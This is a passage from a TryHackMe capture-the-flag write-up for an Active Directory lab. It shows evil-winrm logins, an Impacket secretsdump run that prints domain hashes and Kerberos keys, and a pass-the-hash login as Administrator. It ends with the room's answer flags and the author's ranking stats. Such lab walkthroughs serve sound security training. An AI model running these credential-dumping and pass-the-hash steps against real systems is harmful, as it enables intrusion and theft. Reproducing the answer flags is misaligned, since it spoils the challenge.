SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  VULNNET-RST\Domain Admins                          Group            S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  VULNNET-RST\Denied RODC Password Replication Group Alias            S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  NT AUTHORITY\NTLM Authentication                   Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  Mandatory Label\High Mandatory Level               Label            S-1-16-12288
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  PRIVILEGES INFORMATION
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  ----------------------
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  Privilege Name                            Description                                                        State
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  ========================================= ================================================================== =======
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeSystemtimePrivilege                     Change the system time                                             Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeBackupPrivilege                         Back up files and directories                                      Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeRestorePrivilege                        Restore files and directories                                      Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeShutdownPrivilege                       Shut down the system                                               Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeDebugPrivilege                          Debug programs                                                     Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeUndockPrivilege                         Remove computer from docking station                               Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeTimeZonePrivilege                       Change the time zone                                               Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  USER CLAIMS INFORMATION
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  -----------------------
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  User claims unknown.
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  
SMB         10.10.178.156   445    WIN-2BO8M1OE1M1  Kerberos support for Dynamic Access Control on this device has been disabled.
root@ip-10-10-18-199:~# 

```

<h3>evil-winrm</h3>

```bash
:~# evil-winrm -i 10.10.178.156 -u a-whitehat -p bNdKVkjv3RR9ht
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\a-whitehat\Documents>
...
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> dir


    Directory: C:\Users\enterprise-core-vn\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt


*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
THM{726b7c0baaac1455d05c827b5561f4ed}
*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop>
...
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
Access to the path 'C:\Users\Administrator\Desktop\system.txt' is denied.
At line:1 char:1
+ type system.txt
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Users\Admini...ktop\system.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

<h3>secretsdump</h3>
<p>Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::</p>
<p>Administrator:c2597747aa5e43022a3a3049a3c3b09d</p>

```bash
:~# python3.9 /opt/impacket/build/scripts-3.9/secretsdump.py vulnnet.rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.178.156
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:cd2aea17efc92508b6fc61897b2c9badc195e9960a35993228faa1992a957296
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:711e6734ca55b573fd0f1e1eacda17c7
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:38381a3189161352
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:9b6e1863b8c09352f66c73e6962a1a130431d5d59e84e6aa72cebe3f34c6dbb5dd15015faba8af367ea47d4c010fe40cdf94b5421c22dfd131038648fbb2158250334c29b4cea163463e73a5a89c2372917f8b80b19b8fa3151565a5c6c16a37f93bf5199bccfe8c14c8c28aa13db75e029e8e559212533e1d5b95c4ef3718311eab890834079e959f61ddf751ee9a108c883cb58f539c1e8ae8fcb29796dc72a9c720ad3f8998d2c7c656dd8dd112420cdb790c5783fbaec8bb2cad30f693438d969094467c3f44f8d542b2e9831ffecd9d0663be6a906a3bb99d1fe4ca2587adaab6f96d6f78bffcbf5196fb0b7da8
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:cd469fbf9342a1a4026b74d0a08ca34b:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:cd469fbf9342a1a4026b74d0a08ca34b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:cd2aea17efc92508b6fc61897b2c9badc195e9960a35993228faa1992a957296
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:711e6734ca55b573fd0f1e1eacda17c7
WIN-2BO8M1OE1M1$:des-cbc-md5:1cb6078c79e620b3
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
...
KeyError: 'Cryptodome.Cipher.AES'
```

<h3>Evil-WinRM</h3>

```bash
:~# evil-winrm -i 10.10.178.156 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:34 PM             39 system.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt
THM{16f45e3934293a57645f8d7bf71d8d4c}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

<br>

<h3 align="left"> Answer the question below</h3>

> 1.1. <em>What is the user flag? (Desktop\user.txt)</em><br><a id='1.1'></a>
>> <strong><code>THM{726b7c0baaac1455d05c827b5561f4ed}</code></strong><br>
<p></p>

<br>

> 1.2. <em>What is the system flag? (Desktop\system.txt)</em><br><a id='1.2'></a>
>> <strong><code>THM{16f45e3934293a57645f8d7bf71d8d4c}</code></strong><br>
<p></p>

<br>
<br>

<h1 align="center">Room Completed</h1>
<br>
<p align="center"><img width="1000px" src="https://github.com/user-attachments/assets/f7c83837-f945-4fff-8948-bf097b38ed43"><br>
                  <img width="1000px" src="https://github.com/user-attachments/assets/1088e487-5eaf-4eaf-bda1-cf534665335d"></p>


<h1 align="center"> My TryHackMe Journey</h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 11 2025      | 401      |     204ᵗʰ    |      4ᵗʰ     |     721ˢᵗ   |    15ᵗʰ    |  107,111 |    774    |     62    |

</div>

<p align="center"> Global All Time:  204ᵗʰ<br><br>
<img width="240px" src="https://github.com/user-attachments/assets/e2dbc695-ba3c-4d5e-badc-6305ef0f6688"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/799b2dc8-a596-4b43-8457-3a597f3261ed"></p>

<p align="center"> Brazil All Time:    4ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/89053e09-b1cd-45f0-8dea-d1e98862d74e"> </p>
"> </p>

<p align="center"> Global monthly:    721ˢᵗ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/60a3f005-9d8e-43cb-86a1-6d2e62b3e4c5"> </p>

<p align="center"> Brazil monthly:    15ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/b77b4e0d-751a-46ad-af56-2511e8aa85fe"> </p>

<h1 align="center">Thanks for coming!!!</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<h1 align="center">Thank you</h1>
<p align="center"><a href="https://tryhackme.com/p/SkyWaves">SkyWaves</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
